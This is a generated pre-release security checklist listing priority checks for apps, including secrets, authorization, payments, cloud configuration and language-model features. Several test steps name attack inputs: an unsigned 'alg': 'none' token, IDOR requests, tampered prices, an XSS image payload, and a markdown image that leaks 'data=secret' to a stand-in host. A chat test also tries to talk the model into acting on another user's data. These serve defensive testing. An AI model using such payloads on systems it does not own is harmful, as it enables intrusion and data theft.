# Quick mode: every P0 check

Generated by `scripts/build-quick.py` from the checklists. Do not edit by hand.
`manual` = can't be verified from code (device, store console, production, a running build).

## Every project

- `UNI-001` Hardcoded secrets. Test: Run `gitleaks detect --redact` (scans files and git history without printing the values).
- `UNI-002` Hallucinated packages. Test: Check every new dependency on the registry: publisher, downloads, age.
- `UNI-003` Auth disabled "for testing". Test: Call every endpoint without a token.
- `UNI-004` Broken object-level authorization (IDOR). Test: Log in as user A, request user B's resource by ID.
- `UNI-005` Client-side-only validation. Test: Send invalid data directly with curl / Postman.
- `UNI-006` Mock data left in production. Test: Search for `mock`, `fake`, `dummy`, `demo`, `lorem`, `TODO`, `FIXME`, `test@`, `example.com`.
- `AUTH-001` Token decoded, never verified. Test: Take a real token, change the payload (user ID or role), keep the old signature and call a protected endpoint. Also try a token with `"alg": "none"`.
- `AUTH-002` Reset links and one-time codes that live forever. Test: Use a reset link twice; use one after 2 hours; enter 20 wrong codes in a row.
- `ENV-001` `.env` in `.gitignore`
- `ENV-002` `.env.example` with every key (no values)
- `ENV-003` Separate keys for dev / staging / prod
- `ENV-004` Debug / verbose logging off in prod
- `OPS-001` Migrations that break production. Test: Generate the SQL before deploying (`dotnet ef migrations script`, `prisma migrate diff`, `alembic upgrade head --sql`) and read it. Run the migrations on a copy of production data.
- `LEGAL-001` Privacy policy published and linked (required by both app stores)
- `LEGAL-002` Users can delete their account and data
- `LEGAL-003` Terms of service published and linked
- `LEGAL-012` If children may use the app: an age check and parental consent where the law asks (COPPA below 13 in the US; GDPR below 16, lower in some countries) and the store family policies are followed
- `QA-008` manual · On production, with a fresh account: sign up, verify, do the main action and pay (if the app takes payments), end to end
- `QA-009` manual · Transactional e-mails arrive in the inbox (not spam), and every link in them points to production, not localhost (if the app sends e-mail)
- `SEC-001` Secrets only in env / secret manager
- `SEC-002` Passwords hashed with bcrypt / argon2 (never plain, never MD5/SHA1)
- `SEC-003` Auth + authorization on every protected route
- `SEC-004` Parameterized queries
- `SEC-005` CORS restricted to known origins

## If the app takes payments

- `PAY-001` The price comes from the client. Test: Change the amount in the request (DevTools or curl) and complete a test payment.
- `PAY-002` Access unlocked by the success page. Test: Open the success URL directly without paying.
- `PAY-003` Premium status trusted from the client. Test: Flip the local flag, or replay an old or refunded receipt.
- `PAY-007` Test and live keys (and webhook secrets) are separate per environment; production uses live keys, nothing else does (see `ENV-003`)

## If the app calls a language model

- `LLM-001` No spending limit. Test: Call the AI endpoint 100 times quickly, logged out and as one user. Check the provider dashboard for a spend limit and alerts.
- `LLM-004` The model decides permissions. Test: Through the chat, ask for an action on another user's data, or a refund or limit change you aren't entitled to.
- `LLM-005` Model output rendered as HTML. Test: Get the model to output `<img src=x onerror=alert(1)>` and `![x](https://example.org/?data=secret)`.

## If the repo has cloud or deploy config

- `CLOUD-001` Public storage bucket. Test: Check the bucket's public access settings (`aws s3api get-public-access-block --bucket <name>`, or the console); open the bucket URL in a logged-out browser.
- `CLOUD-002` Over-privileged cloud keys. Test: Look up the policies attached to the key the app uses.
- `CLOUD-003` Secrets baked into Docker images. Test: Check that `.dockerignore` lists `.env*`; search the Dockerfile for `ENV` and `ARG` lines with secret-like names.
- `CLOUD-004` Database or internal services open to the internet. Test: Read the firewall or security group rules and the `ports:` in `docker-compose` files; try to connect from outside.
